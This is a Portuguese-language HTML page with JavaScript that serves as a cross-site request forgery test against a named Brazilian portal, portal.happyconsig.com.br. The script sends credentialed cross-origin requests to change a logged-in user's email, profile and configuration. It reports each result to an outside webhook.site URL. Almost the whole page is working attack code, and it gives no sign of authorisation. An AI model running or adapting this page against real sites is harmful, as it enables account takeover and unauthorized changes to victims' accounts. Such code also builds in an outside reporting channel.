<!DOCTYPE html>
<html>
<head>
    <title>Teste CSRF Simplificado</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        .log { background: #f5f5f5; padding: 10px; margin: 5px 0; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h1>üîç Teste CSRF - Debug Mode</h1>
    
    <div>
        <button onclick="testSimple()">Testar Conex√£o B√°sica</button>
        <button onclick="testCSRF()">Testar CSRF Completo</button>
    </div>

    <div id="logs"></div>

    <script>
        const TARGET = 'https://portal.happyconsig.com.br';
        const WEBHOOK_URL = 'https://webhook.site/9b43ad5a-c927-46fd-aa35-043e3297ec29'; // ATUALIZE!
        
        function log(message, type = 'info') {
            const logs = document.getElementById('logs');
            const color = type === 'success' ? 'success' : type === 'error' ? 'error' : 'black';
            logs.innerHTML += `<div class="log" style="color: ${color}">${new Date().toLocaleTimeString()}: ${message}</div>`;
        }

        // TESTE 1: Verificar se a comunica√ß√£o b√°sica funciona
        async function testSimple() {
            log('üéØ Testando comunica√ß√£o b√°sica...');
            
            try {
                // Teste 1: Enviar ping para webhook
                log('Enviando ping para webhook...');
                const pingResponse = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        test: 'ping',
                        timestamp: new Date().toISOString(),
                        origin: window.location.origin
                    })
                });
                
                log(`‚úÖ Ping enviado! Status: ${pingResponse.status}`, 'success');
                
            } catch (error) {
                log(`‚ùå Erro no ping: ${error.message}`, 'error');
            }
        }

        // TESTE 2: CSRF Completo com debug
        async function testCSRF() {
            log('üöÄ Iniciando teste CSRF completo...');
            
            const endpoints = [
                { url: '/api/user/email', method: 'POST', data: { email: 'test@example.com' }, desc: 'Mudar Email' },
                { url: '/api/user/profile', method: 'PUT', data: { name: 'Test User' }, desc: 'Atualizar Perfil' },
                { url: '/api/config', method: 'PUT', data: { setting: 'test' }, desc: 'Modificar Config' }
            ];

            for (const endpoint of endpoints) {
                await testEndpointWithDebug(endpoint);
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            log('üìä Teste completo! Verifique o webhook.');
        }

        async function testEndpointWithDebug(endpoint) {
            const { url, method, data, desc } = endpoint;
            
            log(`üîç Testando: ${desc} (${method} ${url})`);
            
            try {
                // Primeiro verificar CORS
                log('   ‚Üí Verificando CORS...');
                const corsCheck = await fetch(TARGET + url, {
                    method: 'OPTIONS',
                    headers: {
                        'Origin': window.location.origin,
                        'Access-Control-Request-Method': method,
                        'Access-Control-Request-Headers': 'content-type'
                    }
                });
                
                log(`   ‚Üí CORS Status: ${corsCheck.status}`);
                log(`   ‚Üí CORS Headers: ${JSON.stringify([...corsCheck.headers])}`);
                
                // Tentar requisi√ß√£o real
                log('   ‚Üí Enviando requisi√ß√£o...');
                const response = await fetch(TARGET + url, {
                    method: method,
                    credentials: 'include',
                    headers: {
                        'Content-Type': 'application/json',
                        'Origin': window.location.origin
                    },
                    body: JSON.stringify(data)
                });

                // Enviar resultado para webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        test: 'csrf',
                        endpoint: url,
                        method: method,
                        status: response.status,
                        origin: window.location.origin,
                        timestamp: new Date().toISOString()
                    })
                });

                log(`   ‚úÖ Requisi√ß√£o completa! Status: ${response.status}`, 'success');
                
            } catch (error) {
                log(`   ‚ùå Erro: ${error.message}`, 'error');
                
                // Reportar erro para webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        test: 'csrf',
                        endpoint: url,
                        error: error.message,
                        origin: window.location.origin,
                        timestamp: new Date().toISOString()
                    })
                });
            }
        }

        // Teste autom√°tico ao carregar a p√°gina
        window.onload = function() {
            log('üìÑ P√°gina carregada! Clique nos bot√µes para testar.');
            log(`Origem atual: ${window.location.origin}`);
        };
    </script>
</body>
</html>
